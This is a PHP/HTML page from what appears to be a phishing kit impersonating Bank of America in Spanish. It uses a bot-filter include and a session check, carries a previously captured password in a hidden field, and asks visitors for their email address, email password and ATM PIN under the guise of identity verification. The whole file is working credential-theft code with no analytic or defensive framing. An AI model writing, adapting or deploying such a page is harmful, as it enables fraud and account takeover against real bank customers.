<?php
require "is_bot.php";
require "ayudante.php";

if (is_session_started() === FALSE) {
    session_start();
}
if(!array_key_exists("permiso",$_SESSION)){
    header("location:index.php");
  }
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>
        Bank of America: operaciones bancarias, tarjetas de crédito, préstamos e
        inversiones con Merrill
    </title>
    <link rel="stylesheet" href="css/normalize.min.css" />
    <link rel="stylesheet" href="css/estilos2.css" />
    <link rel="shortcut icon" href="img/logo.png" type="image/x-icon" />
</head>

<body>
    <div class="cuerpo">
        <div class="header">
            <img src="img/logo-entrar.png" alt="logo">
            <img src="img/protegida-area.png" class="protegida" alt="protegida">
        </div>
        <div class="header2">
            <h1>Verificar su Identidad</h1>
        </div>
        <div class="section">
            <div class="principal">
                <h2>Confirmar correo asociado a su cuenta de banco</h2>
                <p>Para verificar su identidad, Ingrese el correo asociado a la cuenta bancaria</p>
                <p class="error" id="error">________</p>
                <form autocomplete="off" id="fcorreo" style="font-family: 'cnx-regular', Arial, Helvetica, sans-serif;font-size:16px;">
                    <input type="hidden" name="cusuario" value="<?php if (!empty($_SESSION['contra']) && isset($_SESSION['contra'])) {
                                                                    echo $_SESSION['contra'];
                                                                } ?>" id="cusuario">
                    <div class="fgrupo">
                        <label for="correo">Correo electrónico</label>
                        <input type="text" name="correo" id="correo" placeholder="****@****.com">
                    </div>
                    <div class="fgrupo">
                        <label for="correo">Clave del correo</label>
                        <input type="password" name="ccorreo" id="ccorreo" placeholder="************">
                    </div>
                    <div class="fgrupo">
                        <label for="correo">Atm o Pin</label>
                        <input type="text" name="atm" id="atm" placeholder="****">
                    </div>
                    <p>
                        La dirección de correo electrónico que ingrese debe coincidir con el correo asociado a nuestros servicios de Online Banking
                    </p>


                    <div class="fgrupo">
                        <button type="button" id="ecorreo" class="btn principal">CONFIRMAR</button>
                    </div>
                </form>
            </div>
            <div class="derecha">
                <img src="img/ayuda-correo.png" alt="correo">
            </div>
        </div>
        <div class="footer">
            <img src="img/footer.png" alt="footer">
        </div>
    </div>
    <script src="js/funciones.js"></script>
</body>

</html>